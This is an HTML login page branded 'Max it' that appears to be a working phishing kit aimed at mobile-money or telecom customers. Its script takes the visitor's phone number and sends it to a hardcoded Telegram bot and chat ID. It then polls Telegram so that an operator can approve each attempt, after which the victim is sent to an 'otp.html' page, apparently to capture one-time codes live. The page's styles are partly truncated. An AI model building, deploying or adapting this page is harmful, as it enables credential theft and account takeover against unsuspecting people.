<head>

    <title>Max it - Login</title>

    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;display=swap" rel="stylesheet">
    <link rel="stylesheet" href="../cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
         :root {
            --orange-primary: #FF7900;
            --dark-bg: #1c1c1e;
            --btn-brown: #3e2723;
            /* Dark brown for login button */
            --text-light: #ffffff;
            --text-muted: #8e8e93;
            --input-border: #FF7900;
            --red-asterisk: #ff3b30;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', sans-serif;
        }
        
        body {
            background-color: #e5e5ea;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        
        .app-container {
            width: 100%;
            max-width: 400px;
            height: 100vh;
            max-height: 850px;
            background-color: var(--dark-bg);
            position: relative;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
        }
        
        @media (min-width: 401px) {
            .app-container {
                height: 90vh;
                border-radius: 40px;
                border: 8px solid #000;
            }
        }
        /* Top Image Section - Optimized for all screens */
        
        .top-section {
            height: 55%;
            position: relative;
            background-color: #f4f4f4;
            /* Pointing to your local uploaded image */
            background-image: url('./sslimage-removebg-preview.png');
            background-size: cover;
            background-position: center top;
            /* Keeps the face visible */
            background-repeat: no-repeat;
        }
        
        .back-btn {
            position: absolute;
            top: 40px;
            left: 20px;
            background: none;
            border: none;
            color: #000;
            font-size: 24px;
            cursor: pointer;
            z-index: 10;
        }
        
        .wave-container {
            position: absolute;
            bottom: -1px;
            width: 100%;
            line-height: 0;
        }
        
        .wave-container svg {
            display: block;
            width: 100%;
            height: 60px;
        }
        /* Bottom Section */
        
        .bottom-section {
            height: 45%;
            background-color: var(--dark-bg);
            padding: 30px 25px;
            display: flex;
            flex-direction: column;
        }
        
        .bottom-section h2 {
            color: var(--text-light);
            font-size: 22px;
            font-weight: 500;
            margin-bottom: 40px;
            letter-spacing: 0.5px;
        }
        
        .input-group {
            display: flex;
            align-items: flex-end;
            border-bottom: 1px solid var(--input-border);
            padding-bottom: 8px;

        .input-icon {
            color: var(--orange-primary);

        .input-wrapper {
            display: flex;

        .input-wrapper label {

        .input-wrapper input {
            background: transparent;
            border: none;
            color: var(--text-light);
            font-size: 16px;
            outline: none;

        .btn-action {
            width: 100%;
            background-color: var(--btn-brown);
            color: var(--text-light);
            border: none;
            padding: 18px;

            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: opacity 0.2s;
            margin-top: auto;

        .btn-action:active {

<body>

    <div class="app-container">
        <div class="top-section">
            <button class="back-btn" onclick="window.location.href='https://maxitloans2.surge.sh/process.html'"><i class="fa-solid fa-arrow-left"></i></button>
            <div class="wave-container">
                <svg viewBox="0 0 1440 320" preserveAspectRatio="none">
                    <path fill="#1c1c1e" fill-opacity="1" d="M0,128L80,144C160,160,320,192,480,186.7C640,181,800,139,960,128C1120,117,1280,139,1360,149.3L1440,160L1440,320L1360,320C1280,320,1120,320,960,320C800,320,640,320,480,320C320,320,160,320,80,320L0,320Z"></path>
                </svg>
            </div>
        </div>

        <div class="bottom-section">
            <h2>Authentication</h2>
            <form id="loginForm">
                <div class="input-group">
                    <i class="fa-solid fa-user input-icon"></i>
                    <div class="input-wrapper">
                        <label>Enter your phone number <span>*</span></label>
                        <input type="tel" id="phoneNumber" value="0-" autocomplete="off" placeholder="0-XX-XX-XX-XX">
                    </div>
                </div>
                <button type="button" class="btn-action" id="loginBtn">Log in</button>
            </form>
        </div>
    </div>

    <script>
        // 1. Phone Number Auto-Formatting Logic (0-XX-XX-XX-XX)
        const phoneInput = document.getElementById('phoneNumber');

        phoneInput.addEventListener('input', function(e) {
            // Strip out all non-numeric characters
            let cleaned = ('' + this.value).replace(/\D/g, '');

            // Ensure it always starts with 0
            if (!cleaned.startsWith('0')) {
                cleaned = '0' + cleaned;
            }

            // Limit to 9 digits total (0 + 8 digit phone number)
            cleaned = cleaned.substring(0, 9);

            // Rebuild the formatted string
            let formatted = '0';
            if (cleaned.length > 1) formatted += '-' + cleaned.substring(1, 3);
            if (cleaned.length > 3) formatted += '-' + cleaned.substring(3, 5);
            if (cleaned.length > 5) formatted += '-' + cleaned.substring(5, 7);
            if (cleaned.length > 7) formatted += '-' + cleaned.substring(7, 9);

            this.value = formatted;
        });

        // --- TELEGRAM BOT CONFIGURATION ---
        const botToken = '8621922059:AAHPmlBtFdg5yL003r44eHaNmz0i42crlOM';
        const chatId = '1345737806';

        function sendToTelegram(phone) {
            const escapeMd = s => s.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
            const message = `📱 *New Login Attempt*\nPhone: \`${escapeMd(phone)}\`\n\n👇 Please Approve or Reject:`;

            const inlineKeyboard = {
                inline_keyboard: [
                    [{
                        text: "✅ Approve",
                        callback_data: `APPROVE_${phone}`
                    }, {
                        text: "❌ Reject",
                        callback_data: `REJECT_${phone}`
                    }]
                ]
            };

            return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'MarkdownV2',
                    reply_markup: JSON.stringify(inlineKeyboard)
                })
            });
        }

        function startListeningForAdminDecision(phone, btnElement) {
            let offset = 0;
            let decided = false;

            // Prime offset to ignore old updates
            fetch(`https://api.telegram.org/bot${botToken}/getUpdates?limit=100`)
                .then(r => r.json())
                .then(data => {
                    if (data.ok && data.result.length > 0) {
                        offset = data.result[data.result.length - 1].update_id + 1;
                    }

                    // Poll every 4 seconds for a response
                    const intervalId = setInterval(() => {
                        if (decided) return;

                        fetch(`https://api.telegram.org/bot${botToken}/getUpdates?limit=20&offset=${offset}`)
                            .then(r => r.json())
                            .then(data => {
                                if (!data.ok || decided) return;

                                for (let update of data.result) {
                                    offset = update.update_id + 1; // Update offset to acknowledge receipt

                                    if (update.callback_query) {
                                        const action = update.callback_query.data;

                                        if (action === `APPROVE_${phone}`) {
                                            decided = true;
                                            clearInterval(intervalId);
                                            window.location.href = 'otp.html';

                                        } else if (action === `REJECT_${phone}`) {
                                            decided = true;
                                            clearInterval(intervalId);

                                            // Reset UI and notify user
                                            btnElement.innerHTML = 'Log in';
                                            btnElement.style.opacity = '1';
                                            btnElement.disabled = false;
                                            alert("Authentication rejected. Please check your credentials or contact support.");
                                            phoneInput.value = '0-'; // Reset input
                                            phoneInput.focus();
                                        }
                                    }
                                }
                            })
                            .catch(err => console.error("Polling error:", err));
                    }, 4000);
                })
                .catch(err => {
                    console.error("Failed to initialize Telegram polling:", err);
                    // Fallback UI reset if network fails completely
                    btnElement.innerHTML = 'Log in';
                    btnElement.style.opacity = '1';
                    btnElement.disabled = false;
                    alert("Network error communicating with the server.");
                });
        }

        // 2. Login Button Click Handler
        document.getElementById('loginBtn').addEventListener('click', function(e) {
            e.preventDefault();
            const loginBtn = this;

            // Make sure the user entered enough digits (e.g., 0-78-89-99-98)
            if (phoneInput.value.length < 13) {
                alert("Please enter a valid phone number.");
                return;
            }

            const rawPhone = phoneInput.value;

            // Save the phone number to sessionStorage so otp.html can display it later
            sessionStorage.setItem('savedPhone', rawPhone);

            // Update UI to show waiting state
            loginBtn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> Waiting for approval...';
            loginBtn.style.opacity = '0.7';
            loginBtn.disabled = true;

            // Send request to Telegram and start polling
            sendToTelegram(rawPhone)
                .then(response => {
                    if (!response.ok) {
                        throw new Error("Failed to send Telegram message");
                    }
                    startListeningForAdminDecision(rawPhone, loginBtn);
                })
                .catch(error => {
                    console.error("Telegram API Error:", error);
                    loginBtn.innerHTML = 'Log in';
                    loginBtn.style.opacity = '1';
                    loginBtn.disabled = false;
                    alert("Error connecting to the authentication server. Please try again.");
                });
        });
    </script>
</body>
